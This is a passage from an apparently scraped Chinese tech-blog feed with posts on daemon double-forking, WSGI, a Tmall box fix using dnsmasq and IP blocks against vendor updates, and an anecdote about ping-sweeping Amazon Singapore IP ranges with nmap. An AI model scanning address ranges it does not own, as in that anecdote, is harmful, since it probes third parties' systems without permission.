&lt;p&gt;So why the double fork? POSIX.1-2008 Sec. 11.2 …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;h1&gt;为什么daemon进程fork两次&lt;/h1&gt;
&lt;p&gt;写daemon进程的一版方式为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pid = os.fork()
if pid &amp;gt; 0:
    exit(0)
os.setsid()
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;但看网上很多有fork两次的写法：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pid = os.fork()
if pid &amp;gt; 0:
    exit(0)
os.setsid()
pid = os.fork()
if pid &amp;gt; 0:
    exit(0)
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我感觉是没必要，第一次fork后，父进程退出了，子进程已经托管给init进程，然后调用setsid成为会话首进程，就已经是daemon进程了。为什么还要调用第二次fork？&lt;/p&gt;
&lt;p&gt;看stackoverflow上的&lt;a href="http://stackoverflow.com/questions/881388/what-is-the-reason-for-performing-a-double-fork-when-creating-a-daemon"&gt;讨论&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;So why the double fork? POSIX.1-2008 Sec. 11.2.3, "The Controlling Terminal", has the answer (emphasis added):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The controlling terminal for a session is allocated by the session leader in an implementation-defined manner. If a session leader has no controlling terminal, and opens a terminal device file that is not already associated with a session without using the O_NOCTTY option (see open()), it is implementation-defined whether the terminal becomes the controlling terminal of the session leader. If a process which is not a session leader opens a terminal file, or the O_NOCTTY option is used on open(), then that terminal shall not become the controlling terminal of the calling process.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This tells us that if a daemon process does something like this ...&lt;/p&gt;
&lt;p&gt;int fd = open("/dev/console", O_RDWR);
... then the daemon process might acquire /dev/console as its controlling terminal, depending on whether the daemon process is a session leader, and depending on the system implementation. The program can guarantee that the above call will not acquire a controlling terminal if the program first ensures that it is not a session leader.&lt;/p&gt;
&lt;p&gt;Normally, when launching a daemon, setsid is called (from the child process after calling fork) to dissociate the daemon from its controlling terminal. However, calling setsid also means that the calling process will be the session leader of the new session, which leaves open the possibility that the daemon could reacquire a controlling terminal. The double-fork technique ensures that the daemon process is not the session leader, which then guarantees that a call to open, as in the example above, will not result in the daemon process reacquiring a controlling terminal.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;第二次fork是为了避免daemon进程不是会话首进程(session leader)，如果是会session leader进程，可能会打开controlling terminal，fork两次实为更保险的做法。如果代码中不会打开&lt;code&gt;terminal device&lt;/code&gt;，或者打开会带上&lt;code&gt;O_NOCTTY&lt;/code&gt;，那么一次fork也是行的。&lt;/p&gt;
&lt;p&gt;那么daemon进程为什么要避免打开&lt;code&gt;controlling terminal&lt;/code&gt;呢？&lt;a href="http://stackoverflow.com/questions/12079059/why-prevent-a-file-from-opening-as-controlling-terminal-with-o-noctty"&gt;参考这个&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Having a controlling tty means there are certain conditions where specific signals might be sent to your program in response to things happening on the tty/window where your program is running. If the program is intended to be a daemon, it's generally cleaner to make sure you don't have a controlling tty than it is to try to write code to handle all the extra conditions that you don't really care about to begin with...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是说为了避免在代码里面去handler你不关心的外部异常。&lt;/p&gt;
&lt;p&gt;网上很多人说两次fork是为了避免僵尸进程，在daemon进程里面可不是这么回事。
比如说写一个web server服务器，主进程用于接收请求，每来一个请求，主进程fork一个子进程来处理，但主进程不能阻塞(wait_pid)，于是子进程再fork一次，子进程退出，init进程成为子进程fork出来的字进程的父进程，主进程将进程的善后工作交给init进程，避免出现僵尸进程。&lt;/p&gt;
&lt;p&gt;一个python写的daemon进程例子：&lt;a href="http://www.jejik.com/articles/2007/02/a_simple_unix_linux_daemon_in_python/"&gt;http://www.jejik.com/articles/2007/02/a_simple_unix_linux_daemon_in_python/&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>wsgi</title><link href="https://lovedboy.github.io/blog/1970/01/01/wsgi.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/wsgi.html</id><summary type="html">&lt;h3&gt;什么是WSGI&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Web服务器网关接口（Python Web Server Gateway Interface，缩写为WSGI）是为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口。自从WSGI被开发出来以后，许多其它语言中也出现了类似接口。&lt;/p&gt;
&lt;p&gt;WSGI is not a server, a python module, a framework, an API or any kind of software. It is just an interface specification by which server and application communicate. Both server and application interface sides are specified in the …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;h3&gt;什么是WSGI&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Web服务器网关接口（Python Web Server Gateway Interface，缩写为WSGI）是为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口。自从WSGI被开发出来以后，许多其它语言中也出现了类似接口。&lt;/p&gt;
&lt;p&gt;WSGI is not a server, a python module, a framework, an API or any kind of software. It is just an interface specification by which server and application communicate. Both server and application interface sides are specified in the PEP 3333. If an application (or framework or toolkit) is written to the WSGI spec then it will run on any server written to that spec.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是说&lt;strong&gt;WSGI仅仅是一个web server和application沟通的规范而已&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;那什么是WSGI server呢？顾名思义就是支持WSGI沟通的HTTP server。&lt;/p&gt;
&lt;h3&gt;WSGI的目的&lt;/h3&gt;
&lt;p&gt;我认为是保持KISS原则。各个模块专注于做自己的事情。应用开发框架做好自己的URL路由处理、HTML模板等，WSGI server专注于连接处理、并发，各司其职。&lt;/p&gt;
&lt;p&gt;常见的应用程序开发框架有:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Django&lt;/li&gt;
&lt;li&gt;Flask&lt;/li&gt;
&lt;li&gt;webpy&lt;/li&gt;
&lt;li&gt;Tornado&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常见的WSGI server有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Green Unicorn&lt;/li&gt;
&lt;li&gt;Gevent WSGI&lt;/li&gt;
&lt;li&gt;uWSGI&lt;/li&gt;
&lt;li&gt;Tornado&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tornado比较特殊，既可以作为application跑在WSGI server的后面，又可以自己作为WSGI server去运行其它的application，当然也可以直接作为HTTP server（不用WSGI沟通）运行。&lt;/p&gt;
&lt;h3&gt;为什么还需要Nginx&lt;/h3&gt;
&lt;p&gt;既然WSGI server可以直接作为HTTP server运行，为什么我们大都在前面加一个Nginx代理呢？有很多原因，比如可以用Nginx负载均衡将请求转发到不同的HTTP server后面、对静态资源处理的更高效、更安全可靠等。&lt;/p&gt;
&lt;h3&gt;参考&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://wsgi.tutorial.codepoint.net/intro"&gt;http://wsgi.tutorial.codepoint.net/intro&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.digitalocean.com/community/tutorials/a-comparison-of-web-servers-for-python-based-web-applications"&gt;https://www.digitalocean.com/community/tutorials/a-comparison-of-web-servers-for-python-based-web-applications&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>一件蠢事</title><link href="https://lovedboy.github.io/blog/1970/01/01/yi-jian-chun-shi.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/yi-jian-chun-shi.html</id><summary type="html">&lt;p&gt;昨天做了一件蠢事。&lt;/p&gt;
&lt;p&gt;老板说要在亚马逊的新加坡机房开一台机器，给他测试一下ping值。&lt;/p&gt;
&lt;p&gt;虽然说亚马逊EC2实例是默认静止icmp包的，但是这么大的机房肯定会有人手动开放icmp包，我只要用nmap扫描一下亚马逊的新加坡机房的ip段，找出开放icmp的主机，把ip发给老板不就完事了吗？竟然蠢得真的去开了实例。&lt;/p&gt;
&lt;p&gt;用谷歌找出amazon 的&lt;a href="http://www.ccker.com/zh.addr.%E6%96%B0%E5%8A%A0%E5%9D%A1_amazon%E4%BA%9A%E5%A4%AA%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83.html"&gt;新加坡ip段&lt;/a&gt;。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;46.51.216.0 ~ 46.51.223.255
46.137.192.0 ~ 46.137.255.255
54.251.0.0 ~ 54.251.255.255
122.248.192.0 ~ 122.248.255.255
175.41.128.0 ~ 175.41 …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;昨天做了一件蠢事。&lt;/p&gt;
&lt;p&gt;老板说要在亚马逊的新加坡机房开一台机器，给他测试一下ping值。&lt;/p&gt;
&lt;p&gt;虽然说亚马逊EC2实例是默认静止icmp包的，但是这么大的机房肯定会有人手动开放icmp包，我只要用nmap扫描一下亚马逊的新加坡机房的ip段，找出开放icmp的主机，把ip发给老板不就完事了吗？竟然蠢得真的去开了实例。&lt;/p&gt;
&lt;p&gt;用谷歌找出amazon 的&lt;a href="http://www.ccker.com/zh.addr.%E6%96%B0%E5%8A%A0%E5%9D%A1_amazon%E4%BA%9A%E5%A4%AA%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83.html"&gt;新加坡ip段&lt;/a&gt;。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;46.51.216.0 ~ 46.51.223.255
46.137.192.0 ~ 46.137.255.255
54.251.0.0 ~ 54.251.255.255
122.248.192.0 ~ 122.248.255.255
175.41.128.0 ~ 175.41.191.255
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;用nmap扫描第一个ip段：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nmap -sP -PI 46.51.216.0/21
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;从扫描结果中随便挑一个ip即可。&lt;/p&gt;</content></entry><entry><title>拯救天猫魔盒</title><link href="https://lovedboy.github.io/blog/1970/01/01/zheng-jiu-tian-mao-mo-he.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/zheng-jiu-tian-mao-mo-he.html</id><summary type="html">&lt;p&gt;由于众所周知的原因，天猫魔盒升级后删除了所有的非官方视频播放软件。重新安装后软件会被秒删，或者重启后会被清理，这后门留的。少了这些非官方的视频播放软件，盒子基本就成一块板砖了，无奈开启盒子拯救之路。&lt;/p&gt;
&lt;p&gt;1, &lt;strong&gt;首先将盒子恢复出厂设置，为的是降级处理。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2, &lt;strong&gt;配置dns服务器，屏蔽阿里系的所有域名。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为盒子的网络配置是可以指定dns服务器的，为了快速屏蔽阿里系的所有域名，考虑为盒子搭建一个dns服务器。
我用的&lt;a href="https://wiki.archlinux.org/index.php/Dnsmasq"&gt;dnsmasq&lt;/a&gt;，安装完成后在配置文件中添加下列文件。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;listen-address= your-ip
address=/.aliyun.com/127.0.0.1
address=/.yunos.com/127.0.0.1
address=/.taobao.com/127.0.0.1
address=/.alipay.com/127.0.0.1 …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;由于众所周知的原因，天猫魔盒升级后删除了所有的非官方视频播放软件。重新安装后软件会被秒删，或者重启后会被清理，这后门留的。少了这些非官方的视频播放软件，盒子基本就成一块板砖了，无奈开启盒子拯救之路。&lt;/p&gt;
&lt;p&gt;1, &lt;strong&gt;首先将盒子恢复出厂设置，为的是降级处理。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2, &lt;strong&gt;配置dns服务器，屏蔽阿里系的所有域名。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为盒子的网络配置是可以指定dns服务器的，为了快速屏蔽阿里系的所有域名，考虑为盒子搭建一个dns服务器。
我用的&lt;a href="https://wiki.archlinux.org/index.php/Dnsmasq"&gt;dnsmasq&lt;/a&gt;，安装完成后在配置文件中添加下列文件。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;listen-address= your-ip
address=/.aliyun.com/127.0.0.1
address=/.yunos.com/127.0.0.1
address=/.taobao.com/127.0.0.1
address=/.alipay.com/127.0.0.1
address=/.wasu.tv/127.0.0.1
address=/.alipay-inc.com/127.0.0.1
address=/.alibaba.com/127.0.0.1
server=119.29.29.29
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;3, &lt;strong&gt;屏蔽ip&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;屏蔽域名还不能完全起作用，盒子的升级请求可能通过请求固定ip来控制的，这方面我就没有抓包了。在贴吧上看到需要屏蔽下面三个ip才能完全起作用。于是在路由器上面针对盒子添加了几条上网控制规则。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;140.205.172.1
42.120.158.67
42.156.141.75
&lt;/pre&gt;&lt;/div&gt;</content></entry></feed>